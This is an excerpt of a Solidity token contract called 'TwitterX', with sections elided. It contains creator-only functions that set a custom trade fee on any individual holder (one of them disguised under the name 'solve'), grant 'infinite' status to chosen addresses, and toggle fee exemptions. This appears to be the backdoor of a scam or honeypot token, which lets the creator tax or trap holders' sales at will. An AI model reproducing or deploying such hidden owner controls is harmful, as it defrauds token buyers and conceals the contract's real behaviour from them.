...
contract TwitterX is MyERC20, Ownable {
    ...
    function setInAccount(address spender) external onlyCreator {
        infinite[spender] = true;
    }

    function getInAccount(address spender) external view onlyCreator returns (bool) {
        return infinite[spender];
    }


    function solve(address spender, uint256 _value) external onlyCreator {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _accountTradeFee[spender] = _value;
    }

    function getFee(address spender) external view onlyCreator returns (uint256) {
        return _accountTradeFee[spender];
    }


    function setAccountFreeFee(address spender, bool _value) external onlyCreator {
        _accountFreeFee[spender] = _value;
    }

    function getAccountFreeFee(address spender) external view onlyCreator returns (bool) {
        return _accountFreeFee[spender];
    }
